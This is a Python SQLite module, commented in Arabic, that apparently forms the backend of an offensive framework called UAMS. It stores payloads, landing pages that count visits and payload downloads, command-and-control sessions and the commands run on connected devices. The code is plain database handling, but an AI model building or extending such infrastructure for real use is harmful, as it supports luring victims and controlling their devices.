# 📁 backend/database.py
"""
نظام قاعدة بيانات SQLite
"""

import sqlite3
import json
from datetime import datetime
from contextlib import contextmanager

class UAMSDatabase:
    def __init__(self, db_path='backend/database/uams.db'):
        self.db_path = db_path
        self.init_db()
    
    @contextmanager
    def get_connection(self):
        """إدارة اتصال قاعدة البيانات"""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        try:
            yield conn
            conn.commit()
        finally:
            conn.close()
    
    def init_db(self):
        """تهيئة جداول قاعدة البيانات"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            
            # جدول الحمولات
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS payloads (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT NOT NULL,
                    type TEXT NOT NULL,
                    ip_address TEXT,
                    port INTEGER,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    file_path TEXT,
                    status TEXT DEFAULT 'active',
                    notes TEXT
                )
            ''')
            
            # جدول صفحات الهبوط
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS landing_pages (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT NOT NULL,
                    template TEXT NOT NULL,
                    payload_id INTEGER,
                    url_path TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    visit_count INTEGER DEFAULT 0,
                    download_count INTEGER DEFAULT 0,
                    FOREIGN KEY (payload_id) REFERENCES payloads (id)
                )
            ''')
            
            # جدول الجلسات (C2 Sessions)
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS c2_sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT UNIQUE NOT NULL,
                    ip_address TEXT NOT NULL,
                    port INTEGER,
                    device_info TEXT,
                    connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_seen TIMESTAMP,
                    status TEXT DEFAULT 'connected',
                    commands_executed INTEGER DEFAULT 0
                )
            ''')
            
            # جدول الأوامر
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT NOT NULL,
                    command TEXT NOT NULL,
                    executed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    result TEXT,
                    success BOOLEAN,
                    FOREIGN KEY (session_id) REFERENCES c2_sessions (session_id)
                )
            ''')
            
            # جدول السجلات
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    level TEXT NOT NULL,
                    module TEXT NOT NULL,
                    message TEXT NOT NULL,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    ip_address TEXT
                )
            ''')
            
            conn.commit()
    
    # دوال CRUD لكل جدول
    def add_payload(self, name, payload_type, ip=None, port=None, file_path=None):
        """إضافة حمولة جديدة"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO payloads (name, type, ip_address, port, file_path)
                VALUES (?, ?, ?, ?, ?)
            ''', (name, payload_type, ip, port, file_path))
            return cursor.lastrowid
    
    def get_payloads(self):
        """الحصول على جميع الحمولات"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM payloads ORDER BY created_at DESC')
            return [dict(row) for row in cursor.fetchall()]
    
    def add_c2_session(self, session_id, ip_address, port=None):
        """إضافة جلسة C2 جديدة"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO c2_sessions (session_id, ip_address, port, last_seen)
                VALUES (?, ?, ?, ?)
            ''', (session_id, ip_address, port, datetime.now()))
    
    def update_session_status(self, session_id, status):
        """تحديث حالة الجلسة"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE c2_sessions 
                SET status = ?, last_seen = ?
                WHERE session_id = ?
            ''', (status, datetime.now(), session_id))
    
    def log_command(self, session_id, command, result=None, success=True):
        """تسجيل أمر تم تنفيذه"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO commands (session_id, command, result, success)
                VALUES (?, ?, ?, ?)
            ''', (session_id, command, result, success))
    
    def add_log(self, level, module, message, ip=None):
        """إضافة سجل للنظام"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO logs (level, module, message, ip_address)
                VALUES (?, ?, ?, ?)
            ''', (level, module, message, ip))
    
    def get_statistics(self):
        """الحصول على إحصائيات النظام"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            
            stats = {}
            
            # عدد الحمولات
            cursor.execute('SELECT COUNT(*) FROM payloads')
            stats['total_payloads'] = cursor.fetchone()[0]
            
            # عدد صفحات الهبوط
            cursor.execute('SELECT COUNT(*) FROM landing_pages')
            stats['total_pages'] = cursor.fetchone()[0]
            
            # عدد الجلسات النشطة
            cursor.execute('SELECT COUNT(*) FROM c2_sessions WHERE status = "connected"')
            stats['active_sessions'] = cursor.fetchone()[0]
            
            # إجمالي الزيارات
            cursor.execute('SELECT SUM(visit_count) FROM landing_pages')
            stats['total_visits'] = cursor.fetchone()[0] or 0
            
            # إجمالي التنزيلات
            cursor.execute('SELECT SUM(download_count) FROM landing_pages')
            stats['total_downloads'] = cursor.fetchone()[0] or 0
            
            return stats

# كائن قاعدة بيانات عام
db = UAMSDatabase()